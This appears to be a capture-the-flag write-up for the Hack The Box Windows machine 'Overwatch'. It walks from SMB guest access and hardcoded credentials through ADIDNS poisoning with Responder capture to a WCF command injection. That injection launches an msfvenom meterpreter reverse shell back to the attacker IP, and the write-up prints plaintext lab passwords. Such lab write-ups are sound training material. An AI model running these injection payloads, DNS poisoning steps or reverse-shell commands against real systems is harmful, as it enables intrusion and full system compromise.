# Overwatch

**Target IP:** `10.129.244.81`   
**Hostname:** `overwatch.htb`    
**Platform:** `Windows`    
**Difficulty:** `Medium`    

---

## 1. Enumeration

### Port Scan

Initial Nmap scan reveals a standard Windows Domain Controller environment:

```nmap
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

A subsequent full port scan (that I performed later but have included here for readability) identified several non-standard high ports, including MSSQL on a custom port:
![](Screenshots/Pasted%20image%2020260508111834.png)

### SMB Enumeration

Checking for anonymous or guest access to SMB shares returns that guest access is possible:

```bash
smbmap -H 10.129.244.81 --no-pass -u "guest" -p ""
```

![](Screenshots/Pasted%20image%2020260508112534.png)

The share `software$` is readable. We can inspect what is in this share by connecting to it:
```bash
smbclient \\\\10.129.244.81\\software$ -N 
```

It contains a directory named `Monitoring` with a .NET application _overwatch.exe_ and other .NET related files:

![](Screenshots/Pasted%20image%2020260508112700.png)
### Static Analysis

Decompiling `overwatch.exe` (using ILSpy) and inspecting `overwatch.exe.config` reveals:

1. A connection string or reference to an internal service at `http://overwatch.htb:8000`.
![](Screenshots/Pasted%20image%2020260508115933.png)

2. Hardcoded credentials for a SQL service account.
![](Screenshots/Pasted%20image%2020260508131941.png)

---

## 2. Initial Foothold — DNS Record Injection & MSSQL Coercion

The discovered credentials allow access to the MSSQL instance on port 6520, I first try to directly connect, but this doesn't work:
```bash
mssqlclient.py 'sqlsvc:TI0LKcfHzZw1Vv'@10.129.244.81 -port 6520
```

Implementing windows auth enables this to work:
```bash
mssqlclient.py 'sqlsvc:TI0LKcfHzZw1Vv'@10.129.244.81 -port 6520 -windows-auth
```

Inside the database i can't find anything of note. I notice a linked server, however when attempting to use the link it times out:
![](Screenshots/Pasted%20image%2020260508132850.png)

When it times out, it seems to state that the server name cannot be resolved. This leads me to think it might be vulnerable to **ADIDNS (Active Directory Integrated DNS)** poisoning.

### DNS Manipulation

Using `dnstool.py`, we can add a new 'A' record to the domain that points to our attacker IP. This is used to intercept authentication attempts when triggering a linked server or UNC path. The destination of this record is my attacker IP so I receive the connections:

```bash
dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07 -a add -t A -d 10.10.14.2 10.129.244.81
```

### Exploitation

By using the `use_link` command (or attempting to access a remote data source) via `impacket-mssqlclient`, we force the server to authenticate against our spoofed `SQL07` record:
![](Screenshots/Pasted%20image%2020260508133145.png)

Running **Responder** on the attacker machine captures the plaintext password for the `sqlmgmt` user, which can then be used:
![](Screenshots/Pasted%20image%2020260508133222.png)
### Discovered Credentials

| **Location**           | **Type**  | **Value**                  |
| ---------------------- | --------- | -------------------------- |
| `overwatch.exe` Source | Plaintext | `sqlsvc : TI0LKcfHzZw1Vv`  |
| Responder Capture      | Plaintext | `sqlmgmt : bIhBbzMMnB82yx` |

---

## 3. User Shell

The `sqlmgmt` user has WinRM permissions:

```bash
evil-winrm -i overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

**User.txt** is located at `C:\Users\sqlmgmt\Desktop\user.txt`:
![](Screenshots/Pasted%20image%2020260508133421.png)

---

## 5. Privilege Escalation — WCF Service Command Injection

### Enumeration

Internal enumeration confirms that a service is listening on port **8000**. I suspect that this is the `MonitorService` identified during the initial analysis of `overwatch.exe`:
![](Screenshots/Pasted%20image%2020260508133722.png)

### Port Forwarding

To interact with the internal API, we use **Ligolo-ng** to create a tunnel:

```bash
# Attacker
sudo ip tuntap add user tomro mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
sudo ./proxy -selfcert
```

```bash
# Target (via WinRM)
./agent.exe -connect 10.10.14.2:11601 -ignore-cert
```

After a connection (in ligolo):
```
session
tunnel_start
```
### Vulnerability Analysis

The `overwatch.exe` application hosts a WCF (Windows Communication Foundation) service. Decompilation of the `KillProcess` method shows it takes a string input and concatenates it directly into a PowerShell command:
![](Screenshots/Pasted%20image%2020260508134356.png)

### Where and how can we exploit this function
Going back to the config file, we can see a full URL with a path.
![](Screenshots/Pasted%20image%2020260508140149.png)

Querying this we see the following:
![](Screenshots/Pasted%20image%2020260508140355.png)

This seems to point us towards `?wsdl` implying this is some form of SOAP api. Querying this, we get the full SOAP schema, which should allow us to build an exploit for the vulnerable function:
![](Screenshots/Pasted%20image%2020260508140538.png)

### How the Exploit Works

The application fails to sanitize the `name` parameter. By injecting a semicolon `;`, we can terminate the `Stop-Process` command and start a new, arbitrary command under the context of the service (SYSTEM).

The issue is we need to know how and where to interact with this function.

### Testing RCE
To test this, I built a small script, using the `zeep` library. I also added an entry to overwatch.htb of `240.0.0.1`. This script will attempt to create a file, which we should be able to see in our evil-winrm, confirming RCE is possible:

```python
from zeep import Client 
client = Client('http://overwatch.htb:8000/MonitorService?wsdl')
client.service.KillProcess('notepad; whoami | Out-File C:\\Users\\sqlmgmt\\Documents\\NEW') 
```

And we see the file created, showing we have successful RCE:
![](Screenshots/Pasted%20image%2020260508145321.png)

### Exploit Script

First i create a malicious exe file using metasploit to generate a listener and I upload it to the host using evil-winrm:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o reverse.exe
```

Then I start a listener:
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.2; set lport 4444; exploit"
```

Using the Python `zeep` library to interact with the SOAP WSDL:

```python
from zeep import Client
c = Client('http://overwatch.htb:8000/MonitorService?wsdl')
c.service.KillProcess('notepad; powershell "C:/Users/sqlmgmt/Documents/reverse.exe"')
```

After doing these steps we get a shell on our metasploit listener running as SYSTEM and we can get the root flag:
![](Screenshots/Pasted%20image%2020260508145832.png)

---

## Summary

|**Step**|**Technique**|
|---|---|
|**Initial access**|Static Analysis & ADIDNS record injection|
|**Credential access**|NTLMv2 capture via MSSQL Linked Server coercion|
|**User shell**|WinRM access via cracked credentials|
|**Privilege escalation**|Command Injection in WCF Service (`KillProcess` method)|
